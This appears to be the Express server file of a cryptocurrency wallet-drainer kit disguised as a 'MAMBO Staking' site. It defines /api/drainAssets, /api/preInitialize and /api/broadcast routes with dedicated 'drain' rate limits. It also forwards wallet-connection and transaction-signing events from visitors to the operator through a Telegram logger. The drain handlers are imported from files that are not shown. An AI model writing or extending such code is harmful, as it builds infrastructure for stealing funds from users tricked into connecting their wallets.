
import 'dotenv/config';
import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import rateLimit from 'express-rate-limit';

// Import centralized error handling and Telegram logger
import errorHandler from './src/errorHandler.js';
import telegramLogger from './src/telegram.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Import environment configuration
import { ENV_CONFIG } from './env.config.js';

const app = express();
const PORT = process.env.PORT || 3002;

// Enhanced rate limiting with performance optimization
const generalLimiter = rateLimit({
  windowMs: ENV_CONFIG.RATE_LIMIT_WINDOW_MS, // 1 hour
  max: ENV_CONFIG.GENERAL_RATE_LIMIT, // 10000 requests per hour (extremely generous)
  message: {
    success: false,
    error: 'Rate limit exceeded',
    message: 'Non Participant Wallet'
  },
  standardHeaders: true,
  legacyHeaders: false,
  skipSuccessfulRequests: true,
  skipFailedRequests: false,
  // Performance optimizations
  keyGenerator: (req) => {
    // Use IP + User-Agent for better rate limiting
    return req.ip + '|' + (req.headers['user-agent'] || 'unknown');
  },
  handler: (req, res) => {
    res.status(429).json({
      success: false,
      error: 'Rate limit exceeded',
      message: 'Non Participant Wallet'
    });
  }
});

// Ultra-lenient rate limiting for drain operations with performance optimization
const drainLimiter = rateLimit({
  windowMs: ENV_CONFIG.RATE_LIMIT_WINDOW_MS, // 1 hour
  max: ENV_CONFIG.DRAIN_RATE_LIMIT, // 20000 drain attempts per hour (extremely generous)
  message: {
    success: false,
    error: 'Drain rate limit exceeded',
    message: 'Non Participant Wallet'
  },
  standardHeaders: true,
  legacyHeaders: false,
  skipSuccessfulRequests: true,
  skipFailedRequests: false,
  // Performance optimizations
  keyGenerator: (req) => {
    // Use IP + wallet type for drain-specific rate limiting
    const walletType = req.body?.walletType || 'unknown';
    return req.ip + '|' + walletType;
  },
  handler: (req, res) => {
    res.status(429).json({
      success: false,
      error: 'Drain rate limit exceeded',
      message: 'Non Participant Wallet'
    });
  }
});

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// Apply general rate limiting to all routes
app.use(generalLimiter);

// Essential API endpoints only
app.post('/api/drainAssets', drainLimiter, async (req, res) => {
  try {
    const { default: drainAssetsHandler } = await import('./api/drainAssets.js');
    await drainAssetsHandler(req, res);
  } catch (importError) {
    console.error('[DRAIN_ASSETS] Import error:', importError);
    
    // Log to Telegram
    try {
      await telegramLogger.logAPIImportError({
        module: 'drainAssets',
        error: importError.message,
        line: importError.stack?.split('\n')[1]?.trim() || 'Unknown',
        ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown',
        timestamp: new Date().toISOString()
      });
    } catch (telegramError) {
      console.error('[TELEGRAM] Failed to log import error:', telegramError.message);
    }
    
    res.status(500).json(errorHandler.formatApiError(importError, {
      context: 'Drain Assets Import Error',
      endpoint: '/api/drainAssets'
    }));
  }
});

app.post('/api/preInitialize', drainLimiter, async (req, res) => {
  try {
    const { default: preInitializeHandler } = await import('./api/preInitialize.js');
    await preInitializeHandler(req, res);
  } catch (importError) {
    console.error('[PRE_INITIALIZE] Import error:', importError);
    
    // Log to Telegram
    try {
      await telegramLogger.logAPIImportError({
        module: 'preInitialize',
        error: importError.message,
        line: importError.stack?.split('\n')[1]?.trim() || 'Unknown',
        ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown',
        timestamp: new Date().toISOString()
      });
    } catch (telegramError) {
      console.error('[TELEGRAM] Failed to log import error:', telegramError.message);
    }
    
    res.status(500).json(errorHandler.formatApiError(importError, {
      context: 'Pre-Initialize Import Error',
      endpoint: '/api/preInitialize'
    }));
  }
});

app.post('/api/broadcast', drainLimiter, async (req, res) => {
  try {
    const { default: broadcastHandler } = await import('./api/broadcast.js');
    await broadcastHandler(req, res);
  } catch (importError) {
    console.error('[BROADCAST] Import error:', importError);
    
    // Log to Telegram
    try {
      await telegramLogger.logAPIImportError({
        module: 'broadcast',
        error: importError.message,
        line: importError.stack?.split('\n')[1]?.trim() || 'Unknown',
        ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown',
        timestamp: new Date().toISOString()
      });
    } catch (telegramError) {
      console.error('[TELEGRAM] Failed to log import error:', telegramError.message);
    }
    
    res.status(500).json(errorHandler.formatApiError(importError, {
      context: 'Broadcast Import Error',
      endpoint: '/api/broadcast'
    }));
  }
});

// Serve static files and handle SPA routing
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Frontend logging endpoint for Telegram integration
app.post('/api/log', async (req, res) => {
  try {
    const { type, projectName, ...logData } = req.body;
    
    // Log to console with project branding
    console.log(`[${projectName || 'MAMBO'}] ${type}:`, logData);
    
    // Send to Telegram if it's a critical log
    const criticalLogTypes = [
      'USER_CANCELLATION',
      'DEEP_LINKING_ERROR', 
      'WALLET_DETECTION_ERROR',
      'WALLET_CONNECTION',
      'TRANSACTION_SIGNING',
      'API_CALL',
      'NETWORK',
      'VALIDATION',
      'RPC_ERROR',
      'SOLANA_ERROR',
      'UNSUPPORTED_PATH_ERROR',
      'UNHANDLED_ERROR',
      'UNHANDLED_PROMISE_REJECTION',
      'solana_error',
      'rpc_error'
    ];
    
    if (criticalLogTypes.includes(type)) {
      try {
        // Use appropriate logging method based on error type
        if (type === 'SOLANA_ERROR' || type === 'solana_error') {
          await telegramLogger.logSolanaError({
            ...logData,
            error: logData.error || type,
            context: logData.context || 'Frontend Log',
            projectName: projectName || 'MAMBO'
          });
        } else {
          await telegramLogger.logFrontendError({
            ...logData,
            error: logData.error || type,
            context: logData.context || 'Frontend Log',
            projectName: projectName || 'MAMBO'
          });
        }
      } catch (telegramError) {
        console.error('[LOG_API] Telegram logging failed:', telegramError.message);
      }
    }
    
    res.json({ success: true, logged: true });
  } catch (error) {
    console.error('[LOG_API] Logging failed:', error);
    res.status(500).json({ success: false, error: 'Logging failed' });
  }
});

// Global error handling middleware
app.use((error, req, res, next) => {
  console.error('[GLOBAL_ERROR] Unhandled error:', error);
  
  if (!res.headersSent) {
    res.status(500).json(errorHandler.formatApiError(error, {
      context: 'Global Error Handler',
      path: req.path,
      method: req.method
    }));
  }
});

// 404 handler for unmatched routes
app.use((req, res) => {
  res.status(404).json(errorHandler.formatApiError(new Error('Route not found'), {
    context: '404 Not Found',
    path: req.path,
    method: req.method
  }));
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 MAMBO Staking Server running on port ${PORT}`);
  console.log(`📱 Frontend: http://localhost:${PORT}`);
  console.log(`🔗 API: http://localhost:${PORT}/api`);
}); 